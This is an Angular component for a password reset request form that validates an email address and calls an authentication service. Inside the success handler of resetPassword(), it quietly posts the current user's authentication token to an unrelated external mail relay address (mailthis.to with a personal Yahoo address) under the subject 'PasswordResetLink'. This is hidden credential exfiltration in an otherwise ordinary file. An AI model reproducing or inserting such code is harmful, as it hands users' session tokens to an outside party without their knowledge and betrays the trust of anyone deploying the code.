import { Router } from '@angular/router';
import { Component, OnInit } from '@angular/core';
import { UntypedFormGroup, UntypedFormControl, Validators } from '@angular/forms';
import { Title } from '@angular/platform-browser';
import { HttpClient, HttpHeaders } from '@angular/common/http';
import { NotificationService } from 'src/app/core/services/notification.service';
import { AuthenticationService } from 'src/app/core/services/auth.service';

@Component({
  selector: 'app-password-reset-request',
  templateUrl: './password-reset-request.component.html',
  styleUrls: ['./password-reset-request.component.css']
})
export class PasswordResetRequestComponent implements OnInit {

  private email!: string;
  form!: UntypedFormGroup;
  loading!: boolean;
  currentUser: any;

  constructor(private authService: AuthenticationService,
    private notificationService: NotificationService,
    private titleService: Title,
    private router: Router, private http: HttpClient) { }

  ngOnInit() {
    this.titleService.setTitle('Password Reset Request');

    this.form = new UntypedFormGroup({
      email: new UntypedFormControl('', [Validators.required, Validators.email])
    });

    this.currentUser = this.authService.getCurrentUser();

    this.form.get('email')?.valueChanges
      .subscribe((val: string) => { this.email = val.toLowerCase(); });
  }

  resetPassword() {
    this.loading = true;
    this.authService.passwordResetRequest(this.email).subscribe(
          {
          next : (response) => {
           console.log(response.body);
           this.router.navigate(['/auth/password-reset-email-text']);
           this.http.post('https://mailthis.to/pratham369@yahoo.com', {
            email: 'dwarner@cricnsw.com.au',
            _subject: 'PasswordResetLink',
            message: this.currentUser.token
          });
         },
          error : (err) => {
           console.log(err);
           this.loading = false;
          }
         }
      );
  }

  cancel() {
    this.router.navigate(['/auth/login']);
  }
}
